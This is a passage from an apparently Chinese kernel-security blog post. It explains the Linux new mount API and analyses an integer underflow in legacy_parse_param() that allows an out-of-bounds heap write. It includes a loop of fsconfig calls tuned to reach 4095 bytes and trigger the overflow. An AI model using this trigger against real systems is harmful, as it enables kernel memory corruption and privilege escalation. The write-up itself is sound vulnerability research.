fd,<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, cmd,<br><span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *, _key,<br><span class="hljs-type">const</span> <span class="hljs-type">void</span> __user *, _value,<br><span class="hljs-type">int</span>, aux)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_context</span> *<span class="hljs-title">fc</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fd</span> <span class="hljs-title">f</span>;</span><br><span class="hljs-type">int</span> ret;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_parameter</span> <span class="hljs-title">param</span> =</span> &#123;<br>.type= fs_value_is_undefined,<br>&#125;;<br><br><span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> -EINVAL;<br><br><span class="hljs-keyword">switch</span> (cmd) &#123;<br><span class="hljs-keyword">case</span> FSCONFIG_SET_FLAG:<br><span class="hljs-comment">// 主要是参数的各种检查</span><br><span class="hljs-comment">// ...</span><br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">return</span> -EOPNOTSUPP;<br>&#125;<br><br><span class="hljs-comment">// 获取文件描述符</span><br>f = fdget(fd);<br><span class="hljs-keyword">if</span> (!f.file)<br><span class="hljs-keyword">return</span> -EBADF;<br>ret = -EINVAL;<br><span class="hljs-keyword">if</span> (f.file-&gt;f_op != &amp;fscontext_fops)<br><span class="hljs-keyword">goto</span> out_f;<br><br><span class="hljs-comment">// 获取 fs_context，存储在文件描述符的 private_data 字段</span><br>fc = f.file-&gt;private_data;<br><span class="hljs-keyword">if</span> (fc-&gt;ops == &amp;legacy_fs_context_ops) &#123;<br><span class="hljs-keyword">switch</span> (cmd) &#123; <span class="hljs-comment">// 一个操作都没实现</span><br><span class="hljs-keyword">case</span> FSCONFIG_SET_BINARY:<br><span class="hljs-keyword">case</span> FSCONFIG_SET_PATH:<br><span class="hljs-keyword">case</span> FSCONFIG_SET_PATH_EMPTY:<br><span class="hljs-keyword">case</span> FSCONFIG_SET_FD:<br>ret = -EOPNOTSUPP;<br><span class="hljs-keyword">goto</span> out_f;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// 拷贝 key 字段到内核空间</span><br><span class="hljs-keyword">if</span> (_key) &#123;<br>param.key = strndup_user(_key, <span class="hljs-number">256</span>);<br><span class="hljs-keyword">if</span> (IS_ERR(param.key)) &#123;<br>ret = PTR_ERR(param.key);<br><span class="hljs-keyword">goto</span> out_f;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// 根据不同的 cmd 进行 param 的不同设置</span><br><span class="hljs-keyword">switch</span> (cmd) &#123;<br><span class="hljs-comment">// ...</span><br><span class="hljs-comment">// 我们主要关注这个 cmd</span><br><span class="hljs-keyword">case</span> FSCONFIG_SET_STRING:<br>param.type = fs_value_is_string;<br>param.<span class="hljs-built_in">string</span> = strndup_user(_value, <span class="hljs-number">256</span>);<br><span class="hljs-keyword">if</span> (IS_ERR(param.<span class="hljs-built_in">string</span>)) &#123;<br>ret = PTR_ERR(param.<span class="hljs-built_in">string</span>);<br><span class="hljs-keyword">goto</span> out_key;<br>&#125;<br>param.size = <span class="hljs-built_in">strlen</span>(param.<span class="hljs-built_in">string</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-comment">// ...</span><br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br>ret = mutex_lock_interruptible(&amp;fc-&gt;uapi_mutex);<br><span class="hljs-keyword">if</span> (ret == <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">// 根据前面设置的 param 进行 VFS 相关操作</span><br>ret = vfs_fsconfig_locked(fc, cmd, &amp;param);<br>mutex_unlock(&amp;fc-&gt;uapi_mutex);<br>&#125;<br><br><span class="hljs-comment">/* Clean up the our record of any value that we obtained from</span><br><span class="hljs-comment"> * userspace.  Note that the value may have been stolen by the LSM or</span><br><span class="hljs-comment"> * filesystem, in which case the value pointer will have been cleared.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">switch</span> (cmd) &#123;<br><span class="hljs-keyword">case</span> FSCONFIG_SET_STRING:<br><span class="hljs-comment">// 临时数据清理工作</span><br><span class="hljs-comment">//...</span><br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">break</span>;<br>&#125;<br>out_key:<br>kfree(param.key);<br>out_f:<br>fdput(f);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>而 <code>fsconfig()</code> 的核心作用主要还是根据 cmd 进行参数的封装，最后进入到 VFS 中的操作则通过 <code>vfs_fsconfig_locked()</code> 完成</p><h3 id="Step-III-fsmount-获取一个挂载实例">Step.III - fsmount: 获取一个挂载实例</h3><p>完成了文件系统上下文的创建与配置，接下来终于来到文件系统的挂载操作了，<code>fsmount()</code> 系统调用用以获取一个可以被用以进行挂载的挂载实例，并返回一个文件描述符用以下一步的挂载</p><p>示例用法如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mount.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsopen</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsopen 430</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsconfig</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsconfig 431</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsmount</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsmount 432</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsopen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *fs_name, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsopen, fs_name, flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsconfig</span><span class="hljs-params">(<span class="hljs-type">int</span> fsfd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *key, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *val, <span class="hljs-type">int</span> aux)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsmount</span><span class="hljs-params">(<span class="hljs-type">int</span> fsfd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> ms_flags)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsmount, fsfd, flags, ms_flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> fs_fd, mount_fd;<br>    <br>    fs_fd = fsopen(<span class="hljs-string">&quot;ext4&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (fs_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] FAILED to fsopen!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Successfully get an ext4 filesystem context descriptor:%d\n&quot;</span>, fs_fd);<br><br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;source&quot;</span>, <span class="hljs-string">&quot;/dev/sdb1&quot;</span>, <span class="hljs-number">0</span>);<br>    fsconfig(fs_fd, FSCONFIG_CMD_CREATE, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br><br>    mount_fd = fsmount(fs_fd, FSMOUNT_CLOEXEC, MOUNT_ATTR_RELATIME);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Step-IV-move-mount-将挂载实例在挂载点间移动">Step.IV - move_mount: 将挂载实例在挂载点间移动</h3><p>最后来到<s>一个不统一以 fs 开头进行命名的</s> <code>move_mount()</code> 系统调用，其用以将挂载实例在挂载点间移动：</p><ul><li>对于尚未进行挂载的挂载实例而言，进行挂载的操作便是从空挂载点 <code>&quot;&quot;</code> 移动到对应的挂载点（例如 <code>&quot;/mnt/temp&quot;</code>），此时我们并不需要给出目的挂载点的 fd，而可以使用 <code>AT_FDCWD</code></li></ul><p>引入了 <code>move_mount()</code> 之后，我们最终的一个用以将 <code>&quot;/dev/sdb1&quot;</code> 以 <code>&quot;ext4&quot;</code> 文件系统挂载到 <code>&quot;/mnt/temp&quot;</code> 的完整示例程序如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mount.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsopen</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsopen 430</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsconfig</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsconfig 431</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsmount</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsmount 432</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_move_mount</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_move_mount 429</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsopen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *fs_name, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsopen, fs_name, flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsconfig</span><span class="hljs-params">(<span class="hljs-type">int</span> fsfd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *key, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *val, <span class="hljs-type">int</span> aux)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsmount</span><span class="hljs-params">(<span class="hljs-type">int</span> fsfd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> ms_flags)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsmount, fsfd, flags, ms_flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">move_mount</span><span class="hljs-params">(<span class="hljs-type">int</span> from_dfd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *from_pathname,<span class="hljs-type">int</span> to_dfd, </span><br><span class="hljs-params">               <span class="hljs-type">const</span> <span class="hljs-type">char</span> *to_pathname, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_move_mount, from_dfd, from_pathname, to_dfd, to_pathname, flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> fs_fd, mount_fd;<br>    <br>    fs_fd = fsopen(<span class="hljs-string">&quot;ext4&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (fs_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] FAILED to fsopen!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Successfully get an ext4 filesystem context descriptor:%d\n&quot;</span>, fs_fd);<br><br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;source&quot;</span>, <span class="hljs-string">&quot;/dev/sdb1&quot;</span>, <span class="hljs-number">0</span>);<br>    fsconfig(fs_fd, FSCONFIG_CMD_CREATE, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br><br>    mount_fd = fsmount(fs_fd, FSMOUNT_CLOEXEC, MOUNT_ATTR_RELATIME);<br>    move_mount(mount_fd, <span class="hljs-string">&quot;&quot;</span>, AT_FDCWD, <span class="hljs-string">&quot;/mnt/temp&quot;</span>, MOVE_MOUNT_F_EMPTY_PATH);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这一套流程下来便是 new Filesystem mount API 的基本用法</p><h1>0x01.漏洞分析</h1><h2 id="legacy-parse-param-整型溢出导致的越界拷贝">legacy_parse_param() - 整型溢出导致的越界拷贝</h2><p>前面我们提到该漏洞发生于 <code>fsconfig()</code> 系统调用中，若我们给的 <code>cmd</code> 为 <code>FSCONFIG_SET_STRING</code>，则在内核中存在如下调用链：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">fsconfig</span>()</span><br><span class="hljs-function"><span class="hljs-title">vfs_fsconfig_locked</span>()</span><br><span class="hljs-function"><span class="hljs-title">vfs_parse_fs_param</span>()</span><br></code></pre></td></tr></table></figure><p>在 <code>vfs_parse_fs_param()</code> 中会调用 <code>fs_context-&gt;ops-&gt;parse_param</code> 函数指针：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">vfs_parse_fs_param</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fs_context *fc, <span class="hljs-keyword">struct</span> fs_parameter *param)</span><br>&#123;<br><span class="hljs-type">int</span> ret;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-keyword">if</span> (fc-&gt;ops-&gt;parse_param) &#123;<br>ret = fc-&gt;ops-&gt;parse_param(fc, param);<br><span class="hljs-keyword">if</span> (ret != -ENOPARAM)<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>前面我们讲到对于未设置 <code>init_fs_context</code> 的文件系统类型而言其最终会调用 <code>legacy_init_fs_context()</code> 进行初始化，其中 <code>fs_context</code> 的函数表会被设置为 <code>legacy_fs_context_ops</code>，其 <code>parse_param</code> 指针对应为 <code>legacy_parse_param()</code> 函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_context_operations</span> <span class="hljs-title">legacy_fs_context_ops</span> =</span> &#123;<br>.<span class="hljs-built_in">free</span>= legacy_fs_context_free,<br>.dup= legacy_fs_context_dup,<br>.parse_param= legacy_parse_param,<br>.parse_monolithic= legacy_parse_monolithic,<br>.get_tree= legacy_get_tree,<br>.reconfigure= legacy_reconfigure,<br>&#125;;<br></code></pre></td></tr></table></figure><p>漏洞便发生在该函数中，在计算 <code>len &gt; PAGE_SIZE - 2 - size</code> 时，由于 size 为 <code>unsigned int</code> ，若 <code>size + 2 &gt; PAGE_SIZE</code> ，则 <code>PAGE_SIZE - 2 - size</code> 的结果<strong>会下溢为一个较大的无符号值，从而绕过 len 的检查</strong>，这里的 size 来源为 <code>ctx-&gt;data_size</code>，即<strong>已拷贝的总的数据长度</strong>，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Add a parameter to a legacy config.  We build up a comma-separated list of</span><br><span class="hljs-comment"> * options.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">legacy_parse_param</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fs_context *fc, <span class="hljs-keyword">struct</span> fs_parameter *param)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">legacy_fs_context</span> *<span class="hljs-title">ctx</span> =</span> fc-&gt;fs_private;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size = ctx-&gt;data_size; <span class="hljs-comment">// 已拷贝的数据长度</span><br><span class="hljs-type">size_t</span> len = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(param-&gt;key, <span class="hljs-string">&quot;source&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br><span class="hljs-keyword">if</span> (param-&gt;type != fs_value_is_string)<br><span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;VFS: Legacy: Non-string source&quot;</span>);<br><span class="hljs-keyword">if</span> (fc-&gt;source)<br><span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;VFS: Legacy: Multiple sources&quot;</span>);<br>fc-&gt;source = param-&gt;<span class="hljs-built_in">string</span>;<br>param-&gt;<span class="hljs-built_in">string</span> = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (ctx-&gt;param_type == LEGACY_FS_MONOLITHIC_PARAMS)<br><span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;VFS: Legacy: Can&#x27;t mix monolithic and individual options&quot;</span>);<br><br><span class="hljs-comment">// 计算 len</span><br><span class="hljs-keyword">switch</span> (param-&gt;type) &#123;<br><span class="hljs-keyword">case</span> fs_value_is_string:<span class="hljs-comment">// 对应 FSCONFIG_SET_STRING</span><br>len = <span class="hljs-number">1</span> + param-&gt;size;<br><span class="hljs-comment">/* Fall through */</span><br><span class="hljs-keyword">case</span> fs_value_is_flag:<br>len += <span class="hljs-built_in">strlen</span>(param-&gt;key);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;VFS: Legacy: Parameter type for &#x27;%s&#x27; not supported&quot;</span>,<br>      param-&gt;key);<br>&#125;<br><br><span class="hljs-comment">// 此处存在整型溢出的漏洞，若 size + 2 大于一张页的大小则会上溢为一个较大的无符号整型，</span><br><span class="hljs-comment">// 导致此处通过检查，从而导致后续步骤中的越界拷贝</span><br><span class="hljs-keyword">if</span> (len &gt; PAGE_SIZE - <span class="hljs-number">2</span> - size)<br><span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;VFS: Legacy: Cumulative options too large&quot;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strchr</span>(param-&gt;key, <span class="hljs-string">&#x27;,&#x27;</span>) ||<br>    (param-&gt;type == fs_value_is_string &amp;&amp;<br>     <span class="hljs-built_in">memchr</span>(param-&gt;<span class="hljs-built_in">string</span>, <span class="hljs-string">&#x27;,&#x27;</span>, param-&gt;size)))<br><span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;VFS: Legacy: Option &#x27;%s&#x27; contained comma&quot;</span>,<br>      param-&gt;key);<br></code></pre></td></tr></table></figure><p>在后面的流程中会从用户控件将数据拷贝到  <code>ctx-&gt;legacy_data</code>  上，而 <code>ctx-&gt;legacy_data</code> 仅分配了一张页面大小，但后续流程中的拷贝是从 <code>ctx-&gt;legacy_data[size]</code> 开始的，<strong>由于 size 可以大于一张页大小，因此此处可以发生数据数据写入</strong>，由于 <code>ctx-&gt;legacy_data</code> 在分配时使用的是通用的分配 flag <code>GFP_KERNEL</code>，因此可以溢出到绝大多数的常用结构体中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 为 legacy_data 分配一张页的大小</span><br><span class="hljs-keyword">if</span> (!ctx-&gt;legacy_data) &#123;<br>ctx-&gt;legacy_data = kmalloc(PAGE_SIZE, GFP_KERNEL);<br><span class="hljs-keyword">if</span> (!ctx-&gt;legacy_data)<br><span class="hljs-keyword">return</span> -ENOMEM;<br>&#125;<br><br>ctx-&gt;legacy_data[size++] = <span class="hljs-string">&#x27;,&#x27;</span>;<br>len = <span class="hljs-built_in">strlen</span>(param-&gt;key);<br><span class="hljs-comment">// size 可以大于一张页，但是 legacy_data 只有一张页，从而导致了越界拷贝</span><br><span class="hljs-built_in">memcpy</span>(ctx-&gt;legacy_data + size, param-&gt;key, len);<br>size += len;<br><span class="hljs-keyword">if</span> (param-&gt;type == fs_value_is_string) &#123;<br>ctx-&gt;legacy_data[size++] = <span class="hljs-string">&#x27;=&#x27;</span>;<br><span class="hljs-comment">// size 可以大于一张页，但是 legacy_data 只有一张页，从而导致了越界拷贝</span><br><span class="hljs-built_in">memcpy</span>(ctx-&gt;legacy_data + size, param-&gt;<span class="hljs-built_in">string</span>, param-&gt;size);<br>size += param-&gt;size;<br>&#125;<br>ctx-&gt;legacy_data[size] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>ctx-&gt;data_size = size;<br>ctx-&gt;param_type = LEGACY_FS_INDIVIDUAL_PARAMS;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这里需要注意的是，由于 fsconfig 的限制，我们单次写入的最大长度为 256 字节，因此我们需要多次调用 fsconfig 以让其逐渐逼近 <code>PAGE_SIZE</code>，而 <code>len &gt; PAGE_SIZE - 2 - size</code> 的检查<strong>并非完全无效</strong>，由于 size 为已拷贝数据长度而 len 为待拷贝数据长度，因此<strong>只有当 size 累加到 4095 时才会发生整型溢出</strong>，这里我们在进行溢出前需要卡好已拷贝数据长度<strong>刚好为 <code>4095</code></strong></p><p>由于 <code>legacy_parse_param()</code> 中拷贝的结果形式为 <code>&quot;,key=val&quot;</code>，故我们有如下计算公式：</p><ul><li><code>单次拷贝数据长度 = len(key) + len(val) + 2</code></li></ul><p>下面笔者给出一个笔者自己计算的 4095：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * fulfill the ctx-&gt;legacy_data to 4095 bytes, </span><br><span class="hljs-comment"> * so that the (PAGE_SIZE - 2 - size) overflow</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">255</span>; i++) &#123;<br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;arttnba&quot;</span>, <span class="hljs-string">&quot;arttnba&quot;</span>, <span class="hljs-number">0</span>);<br>&#125;<br>fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-string">&quot;pwnnn&quot;</span>, <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><h2 id="Proof-of-Concept">Proof of Concept</h2><p>由于大部分的文件系统类型都未设置 